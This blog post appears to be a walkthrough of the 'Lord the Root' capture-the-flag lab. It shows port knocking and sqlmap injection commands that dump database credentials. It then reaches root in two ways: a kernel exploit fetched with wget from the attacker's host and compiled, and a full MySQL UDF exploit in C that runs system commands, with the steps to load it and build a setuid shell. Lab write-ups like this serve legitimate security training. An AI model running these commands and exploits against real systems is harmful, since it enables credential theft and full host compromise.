---
layout: post
title: "Lord the Root"
date: 2016-08-12 13:50:04 -0500
comments: true
categories:  [vulhub, mysql, port knocking]
---
###Tools:

* netdiscover
* Nmap
* Wfuzz
* Nikto
* Burpsuite	
* Sqlmap


###Vulnerabilities:
* [Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Root Exploit (1)](https://www.exploit-db.com/exploits/39166/)
* [MySQL 4.x/5.0 - User-Defined Function (UDF) Local Privilege Escalation Exploit (Linux)](https://www.exploit-db.com/exploits/1518/)

<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.41.0/24`
{% img  /images/blog/vulhub/lordroot/Selection_001.png   [title manually exploit [alt text]] %}

192.168.41.159 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.41.159 -p-`

{% img  /images/blog/vulhub/lordroot/Selection_002.png   [title manually exploit [alt text]] %}

Only port 22 is opening.

try to ssh to the box and check the banner


`ssh root@192.168.41.159`

{% img  /images/blog/vulhub/lordroot/Selection_003.png   [title manually exploit [alt text]] %}

find a hint Easy as 1,2,3

looks like port knocking, now try to send packet to port 1, 2 and 3 using [port knocking](https://github.com/wg135/script/blob/master/port_knocking.py) script.

run nmap again,

{% img  /images/blog/vulhub/lordroot/Selection_005.png   [title manually exploit [alt text]] %}

port 1337 is openning and it is running http service.

I used both nikto and wfuzz, nothing interesting come out.


check the page 

{% img  /images/blog/vulhub/lordroot/Selection_006.png   [title manually exploit [alt text]] %}


check the image info, 

{% img  /images/blog/vulhub/lordroot/Selection_007.png   [title manually exploit [alt text]] %}

find an `/images/`, go to the directory.

nothing cool. check the source code find a `/icons/`.

{% img  /images/blog/vulhub/lordroot/Selection_008.png   [title manually exploit [alt text]] %}

check `http://192.168.41.159:1337/robots.txt`

{% img  /images/blog/vulhub/lordroot/Selection_009.png   [title manually exploit [alt text]] %}

I check `THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh` and it is base64 encoded.

Decode it in hackbar, I get:

`Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!`

This is also base64 encoded.

Decode it again, 

`/978345210/index.php`

{% img  /images/blog/vulhub/lordroot/Selection_010.png   [title manually exploit [alt text]] %}

save the post requst in burpsuit as file post.txt

`sqlmap -r post.txt -p username --risk=3 --level=5`

{% img  /images/blog/vulhub/lordroot/Selection_011.png   [title manually exploit [alt text]] %}

username is vulnerable.

get table name

`sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql --tables`


webapp database
{% img  /images/blog/vulhub/lordroot/Selection_012.png   [title manually exploit [alt text]] %}


mysql
{% img  /images/blog/vulhub/lordroot/Selection_013.png   [title manually exploit [alt text]] %}

get columns of webapp

`sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users --columns`

{% img  /images/blog/vulhub/lordroot/Selection_014.png   [title manually exploit [alt text]] %}

dump username and password

`sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users -C username,password --dump`


{% img  /images/blog/vulhub/lordroot/Selection_015.png   [title manually exploit [alt text]] %}


get colums of table user

`sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user --columns`


{% img  /images/blog/vulhub/lordroot/Selection_016.png   [title manually exploit [alt text]] %}

`sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user -C User,Password --dump`

{% img  /images/blog/vulhub/lordroot/Selection_017.png   [title manually exploit [alt text]] %}

try to login web using credential, however, I cannot find anywhere to upload webshell.

I try the credential to login ssh

and `smeagol  | MyPreciousR00t` works


###Local exploit 1:

`uname -a`

then get:

`Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux`

`searchsploit Linux Kernel | grep Ubuntu`

{% img  /images/blog/vulhub/lordroot/Selection_019.png   [title manually exploit [alt text]] %}

```
wget http://192.168.41.149/39166.c
gcc 39166.c -o local
./local
```

get the root


{% img  /images/blog/vulhub/lordroot/Selection_020.png   [title manually exploit [alt text]] %}


###Local exploit 2:

`ps aux |grep root`

{% img  /images/blog/vulhub/lordroot/Selection_021.png   [title manually exploit [alt text]] %}

mysql is running under the root, which is wrong!

login mysql 

`mysql -u root -p`, password is `darkshadow`, and the mysql version is 5.5.44.

{% img  /images/blog/vulhub/lordroot/Selection_022.png   [title manually exploit [alt text]] %}


`searchsploit mysql | grep local`

{% img  /images/blog/vulhub/lordroot/Selection_023.png   [title manually exploit [alt text]] %}


follow the instruction `https://www.exploit-db.com/exploits/1518/`


use the c code:(1518.c)


```c

#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;
 
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);
 
    system(args->args[0]);
 
    return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}

```



```
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
```
in mysql

```
mysql> use mysql
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/1518.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
mysql> create function do_system returns integer soname '1518.so';
mysql> select * from mysql.func;
mysql> select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');
mysql> \! sh
$ cat /tmp/out
```

{% img  /images/blog/vulhub/lordroot/Selection_024.png   [title manually exploit [alt text]] %}

exploit is good. now use [suid.c](https://github.com/wg135/script/blob/master/suid.c)

in mysql:

```
mysql> select do_system('gcc -o /tmp/suid /tmp/suid.c');
mysql> select do_system('chmod u+s /tmp/suid');
```
in /tmp

`./suid`

{% img  /images/blog/vulhub/lordroot/Selection_025.png   [title manually exploit [alt text]] %}